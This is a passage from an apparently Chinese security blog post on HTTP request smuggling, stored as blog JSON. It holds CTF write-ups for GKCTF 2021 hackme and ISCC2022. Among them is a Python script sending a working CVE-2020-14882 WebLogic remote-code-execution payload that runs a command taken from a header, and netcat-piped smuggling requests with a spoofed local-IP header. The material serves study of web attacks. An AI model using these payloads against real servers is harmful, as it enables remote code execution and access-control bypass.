punctuation\">)</span>\nsSocket<span class=\"token operator\">.</span><span class=\"token function\">settimeout</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\nresponse <span class=\"token operator\">=</span> sSocket<span class=\"token operator\">.</span><span class=\"token function\">recv</span><span class=\"token punctuation\">(</span><span class=\"token number\">2147483647</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">while</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>response<span class=\"token operator\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        response <span class=\"token operator\">=</span> sSocket<span class=\"token operator\">.</span><span class=\"token function\">recv</span><span class=\"token punctuation\">(</span><span class=\"token number\">2147483647</span><span class=\"token punctuation\">)</span>\n    except<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">break</span>\nsSocket<span class=\"token operator\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149314.png\" alt=\"在这里插入图片描述\"><br>得到<code>weblogic</code>版本号<code>12.2.1.4.0</code>，而这个版本存在漏洞(CVE-2020-14882)，借此漏洞即可获取flag，这里借用一位大师傅的socket脚本</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">import socket\n\nsSocket <span class=\"token operator\">=</span> socket<span class=\"token operator\">.</span><span class=\"token function\">socket</span><span class=\"token punctuation\">(</span>socket<span class=\"token operator\">.</span><span class=\"token constant\">AF_INET</span><span class=\"token punctuation\">,</span> socket<span class=\"token operator\">.</span><span class=\"token constant\">SOCK_STREAM</span><span class=\"token punctuation\">)</span>\nsSocket<span class=\"token operator\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"node4.buuoj.cn\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">28946</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span> b<span class=\"token string single-quoted-string\">'HEAD / HTTP/1.1\\r\\nHost: node4.buuoj.cn\\r\\n\\r\\nGET /console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]&#123;%22cmd.exe%22,%20%22/c%22,%20cmd&#125;%20:%20new%20String[]&#123;%22/bin/sh%22,%20%22-c%22,%20cmd&#125;;if(cmd%20!=%20null%20)&#123;%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\\\\\\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125;%20currentThread.interrupt(); HTTP/1.1\\r\\nHost:weblogic\\r\\ncmd: /readflag\\r\\n\\r\\n'</span>\n<span class=\"token comment\">#payload = b'GET /a HTTP/1.1\\r\\nHost: node3.buuoj.cn\\r\\nContent-Length: 66\\r\\n\\r\\nGET /console/login/LoginForm.jsp HTTP/1.1\\r\\nHost: weblogic\\r\\n\\r\\n'</span>\nsSocket<span class=\"token operator\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nsSocket<span class=\"token operator\">.</span><span class=\"token function\">settimeout</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\nresponse <span class=\"token operator\">=</span> sSocket<span class=\"token operator\">.</span><span class=\"token function\">recv</span><span class=\"token punctuation\">(</span><span class=\"token number\">2147483647</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">while</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>response<span class=\"token operator\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        response <span class=\"token operator\">=</span> sSocket<span class=\"token operator\">.</span><span class=\"token function\">recv</span><span class=\"token punctuation\">(</span><span class=\"token number\">2147483647</span><span class=\"token punctuation\">)</span>\n    except<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">break</span>\nsSocket<span class=\"token operator\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>脚本运行完即可获取flag，而这个是预期解，针对这题还有另一个解法，可以参考这位大师傅的这篇文章<a href=\"https://laotun.top/2021/09/27/gkctf2021-web%E5%A4%8D%E7%8E%B0/\">https://laotun.top/2021/09/27/gkctf</a></p>\n<h2 id=\"ISCC2022-让我康康\"><a href=\"#ISCC2022-让我康康\" class=\"headerlink\" title=\"ISCC2022[让我康康]\"></a>ISCC2022[让我康康]</h2><p>提示框给了提示是<code>Try flag</code>，访问<code>flag</code>后回显<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149332.png\" alt=\"在这里插入图片描述\"><br>访问此界面<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149485.png\" alt=\"在这里插入图片描述\"><br>回显403，服务器发送请求看一下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149566.png\" alt=\"在这里插入图片描述\"><br>发现服务是<code>gunicorn 20.0.4</code>，这个是存在请求走私漏洞的，因此我们这里就可以构造请求去访问本被禁止访问的<code>fl4g</code>文件<br>构造请求如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">echo</span> <span class=\"token operator\">-</span>en <span class=\"token string double-quoted-string\">\"POST / HTTP/1.1\\r\\nHost: localhost\\r\\nContent-Length: 76\\r\\nSec-Websocket-Key1: x\\r\\n\\r\\nxxxxxxxxPOST /fl4g HTTP/1.1\\r\\nHost: localhost\\r\\nContent-Length: 55\\r\\n\\r\\nPOST / HTTP/1.1\\r\\nHost: 127.0.0.1:80\\r\\n\\r\\n\"</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">nc</span> <span class=\"token number\">59.110</span><span class=\"token number\">.159</span><span class=\"token number\">.206</span> <span class=\"token number\">7020</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>对此部分进行拆分，就是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">POST</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> localhost\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">76</span>\\r\\n\nnSec<span class=\"token operator\">-</span>Websocket<span class=\"token operator\">-</span>Key1<span class=\"token punctuation\">:</span> x\\r\\n\n\\r\\n\nxxxxxxxxPOST <span class=\"token operator\">/</span>fl4g <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> localhost\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">55</span>\\r\\n\n\\r\\n\n<span class=\"token constant\">POST</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> <span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span><span class=\"token punctuation\">:</span><span class=\"token number\">80</span>\\r\\n\n\\r\\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时后端服务器就会认为这是两个请求，即</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">POST</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> localhost\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">76</span>\\r\\n\nnSec<span class=\"token operator\">-</span>Websocket<span class=\"token operator\">-</span>Key1<span class=\"token punctuation\">:</span> x\\r\\n\n\\r\\n\nxxxxxxxx<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>和</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">POST</span> <span class=\"token operator\">/</span>fl4g <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> localhost\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">55</span>\\r\\n\n\\r\\n\n<span class=\"token constant\">POST</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> <span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span><span class=\"token punctuation\">:</span><span class=\"token number\">80</span>\\r\\n\n\\r\\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>按理说就可以访问到<code>f14g</code>，但此时回显需要本地访问，因此我们添加<code>secr3t_ip:127.0.0.1\\r\\n</code>，伪造本地ip</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">echo</span> <span class=\"token operator\">-</span>en <span class=\"token string double-quoted-string\">\"GET / HTTP/1.1\\r\\nHost: localhost\\r\\nContent-Length: 90\\r\\nSec-Websocket-Key1: x\\r\\n\\r\\nxxxxxxxxGET /fl4g HTTP/1.1\\r\\nHost: localhost\\r\\nsecr3t_ip:127.0.0.1\\r\\nContent-Length: 55\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: 127.0.0.1:80\\r\\n\\r\\n\"</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">nc</span> <span class=\"token number\">59.110</span><span class=\"token number\">.159</span><span class=\"token number\">.206</span> <span class=\"token number\">7020</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>请求拆分后如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">GET</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> localhost\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">90</span>\\r\\n\nSec<span class=\"token operator\">-</span>Websocket<span class=\"token operator\">-</span>Key1<span class=\"token punctuation\">:</span> x\\r\\n\n\\r\\n\nxxxxxxxxGET <span class=\"token operator\">/</span>fl4g <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> localhost\\r\\n\nsecr3t_ip<span class=\"token punctuation\">:</span><span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span>\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">55</span>\\r\\n\n\\r\\n\n<span class=\"token constant\">GET</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> <span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span><span class=\"token punctuation\">:</span><span class=\"token number\">80</span>\\r\\n\n\\r\\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149717.png\" alt=\"在这里插入图片描述\"><br>成功获取到<code>flag</code></p>\n<h1 id=\"后言\"><a href=\"#后言\" class=\"headerlink\" title=\"后言\"></a>后言</h1><p>发现还有两道很有意思的请求走私题，那就是<code>Bytectf2021 A-ginx1/2</code>，但是这个题涉及了多个知识点，我是个菜狗，目前还在学习中，故暂时不能作为CTF例题讲解，师傅们如果有兴趣的话可以看这两篇文章，大师傅们都很厉害，写的也非常好。<br><a href=\"https://tttang.com/archive/1396/#toc_0x06\">https://tttang.com/archive/1396/</a><br><a href=\"https://impakho.com/post/bytectf-2021-aginx-writeup\">https://impakho.com/post/bytectf-2021-aginx-writeup</a></p>\n<p>最后，本人只是一个小白，在学习请求走私过程中也可能会出现问题，同时<code>Nginx</code>的请求走私漏洞在学习中并没有复现出来，我参考了其他大师傅的文章后进行了简单总结，没有自己进行测试，所以这个也可能出现问题，还请各位大师傅多多指教。</p>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p><a href=\"https://websec.readthedocs.io/zh/latest/vuln/httpSmuggling.html\">https://websec.readthedocs.io/zh/latest/vuln/httpSmuggling.html</a><br><a href=\"https://paper.seebug.org/1048/#52\">https://paper.seebug.org/1048/#52</a><br><a href=\"https://v0w.top/2020/12/20/HTTPsmuggling/#4-2-3-%E4%BF%AE%E5%A4%8D%E4%B8%8E%E7%BB%95%E8%BF%87\">https://v0w.top/2020/12/20/HTTPsmuggling</a><br><a href=\"https://xz.aliyun.com/t/7501#toc-10\">https://xz.aliyun.com/t/7501#toc-10</a><br><a href=\"https://xz.aliyun.com/t/6654#toc-6\">https://xz.aliyun.com/t/6654#toc-6</a><br><a href=\"https://xz.aliyun.com/t/11423#toc-5\">https://xz.aliyun.com/t/11423#toc-5</a><br><a href=\"https://www.4hou.com/posts/JXK2\">https://www.4hou.com/posts/JXK2</a><br><a href=\"https://xz.aliyun.com/t/11728#toc-17\">https://xz.aliyun.com/t/11728#toc-17</a><br><a href=\"https://xz.aliyun.com/t/6631#toc-5\">https://xz.aliyun.com/t/6631#toc-5</a><br><a href=\"https://www.anquanke.com/post/id/246516#h3-30\">https://www.anquanke.com/post/id/246516#h3-30</a><br><a href=\"https://www.anquanke.com/post/id/210036#h3-11\">https://www.anquanke.com/post/id/210036#h3-11</a><br><a href=\"https://forum.butian.net/share/1876\">https://forum.butian.net/share/1876</a><br><a href=\"https://juejin.cn/post/6997215152533667876\">https://juejin.cn/post/6997215152533667876</a><br><a href=\"https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/#golang\">https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/#golang</a><br><a href=\"https://blog.fundebug.com/2019/09/10/understand-http-content-length/\">https://blog.fundebug.com/2019/09/10/understand-http-content-length/</a><br><a href=\"https://www.yiyayiyawu.cn/archives/http-qing-qiu-zou-si#%E5%AF%BB%E6%89%BEhttp%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E\">https://www.yiyayiyawu.cn/archives/http</a><br><a href=\"https://www.freebuf.com/articles/web/334057.html\">https://www.freebuf.com/articles/web/334057.html</a><br><a href=\"http://1.116.103.114/hole/%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/009-%EF%BC%88CVE-2020-12440%EF%BC%89Nginx%20_=%201.8.0%20%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/#cve-2020-12440nginx-180\">http://1.116.103.114/hole/CVE-2020-12440</a></p>\n","feature":false,"text":"声明文章首发于跳跳糖社区https://tttang.com/archive/1808/ 前言ISCC2022[让我康康]这道赛题在接触时令我记忆犹新，之前由于学习知识其他也一直没有对HTTP请求走私进行相关学习，最近学习过后简单总结如下，希望能对正在学习HTTP请求走私的师傅有...","link":"","photos":[],"count_time":{"symbolsCount":"21k","symbolsTime":"19 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"HTTP请求走私","slug":"HTTP请求走私","count":1,"path":"api/tags/HTTP请求走私.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%A3%B0%E6%98%8E\"><span class=\"toc-text\">声明</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86\"><span class=\"toc-text\">前置知识</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81\"><span class=\"toc-text\">HTTP请求走私</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0\"><span class=\"toc-text\">漏洞成因</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3\"><span class=\"toc-text\">漏洞危害</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">漏洞利用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#CL-0\"><span class=\"toc-text\">CL!&#x3D;0</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#CL-CL\"><span class=\"toc-text\">CL-CL</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#CL-TE\"><span class=\"toc-text\">CL-TE</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%9D%B6%E5%9C%BA%E6%BC%94%E7%A4%BA\"><span class=\"toc-text\">靶场演示</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#TE-CL\"><span class=\"toc-text\">TE-CL</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%9D%B6%E5%9C%BA%E6%BC%94%E7%A4%BA-1\"><span class=\"toc-text\">靶场演示</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#TE-TE\"><span class=\"toc-text\">TE-TE</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%9D%B6%E5%9C%BA%E6%BC%94%E7%A4%BA-2\"><span class=\"toc-text\">靶场演示</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E9%9D%A2\"><span class=\"toc-text\">常见攻击面</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%BB%95%E8%BF%87%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E6%8E%A7%E5%88%B6\"><span class=\"toc-text\">绕过前端安全控制</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%BC%95%E5%8F%91%E5%8F%8D%E5%B0%84%E5%9E%8BXSS\"><span class=\"toc-text\">请求走私引发反射型XSS</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%AE%9E%E7%8E%B0Web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92\"><span class=\"toc-text\">请求走私实现Web缓存投毒</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB%E5%AE%9E%E4%BE%8B\"><span class=\"toc-text\">走私攻击实例</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#gunicorn-20-0-4-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">gunicorn 20.0.4 请求走私漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA\"><span class=\"toc-text\">环境搭建</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Nginx-error-page-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E-CVE-2019-20372\"><span class=\"toc-text\">Nginx error_page 请求走私漏洞(CVE-2019-20372)</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Nginx-lt-1-18-0%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E-CVE-2020-12440\"><span class=\"toc-text\">Nginx&lt;&#x3D;1.18.0请求走私漏洞(CVE-2020-12440)</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#CTF%E5%AE%9E%E6%88%98\"><span class=\"toc-text\">CTF实战</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#RoarCTF-2019-Easy-Calc\"><span class=\"toc-text\">[RoarCTF 2019]Easy Calc</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#GKCTF-2021-hackme\"><span class=\"toc-text\">[GKCTF 2021]hackme</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ISCC2022-%E8%AE%A9%E6%88%91%E5%BA%B7%E5%BA%B7\"><span class=\"toc-text\">ISCC2022[让我康康]</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%90%8E%E8%A8%80\"><span class=\"toc-text\">后言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE\"><span class=\"toc-text\">参考文献</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"PHP代码审计之旅之百家CMS","uid":"2701665bc33e3ae6e528c88e69e6e2f6","slug":"代码审计之旅之百家CMS","date":"2022-11-02T17:41:30.000Z","updated":"2024-02-14T07:30:42.000Z","comments":true,"path":"api/articles/代码审计之旅之百家CMS.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141536144.png","text":"前言之前审计的CMS大多是利用工具，即Seay+昆仑镜联动扫描出漏洞点，而后进行审计。感觉自己的能力仍与零无异，因此本次审计CMS绝大多数使用手动探测，即通过搜索危险函数的方式进行漏洞寻找，以此来提升审计能力，希望对正在学习代码审计的师傅能有所帮助。 环境搭建源码链接如下所示ht...","link":"","photos":[],"count_time":{"symbolsCount":"18k","symbolsTime":"16 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":7,"path":"api/categories/代码审计.json"}],"tags":[{"name":"代码审计","slug":"代码审计","count":6,"path":"api/tags/代码审计.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"初探Mysql反向读取文件","uid":"5a86b73daf28f7e8c8ac977d8c647c4e","slug":"初探Mysql反向读取文件","date":"2022-10-29T06:55:30.000Z","updated":"2023-03-14T07:10:02.000Z","comments":true,"path":"api/articles/初探Mysql反向读取文件.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141509093.png","text":"声明文章首发于FreeBuf社区https://www.freebuf.com/articles/web/348248.html 前言Mysql反向读取文件感觉蛮有意思的，进行了解过后，简单总结如下，希望能对在学习Mysql反向读取文件的师傅有些许帮助。 前置知识在Mysql中存...","link":"","photos":[],"count_time":{"symbolsCount":"3.3k","symbolsTime":"3 mins."},"categories":[{"name":"Mysql","slug":"Mysql","count":1,"path":"api/categories/Mysql.json"}],"tags":[{"name":"蜜罐","slug":"蜜罐","count":1,"path":"api/tags/蜜罐.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":false}}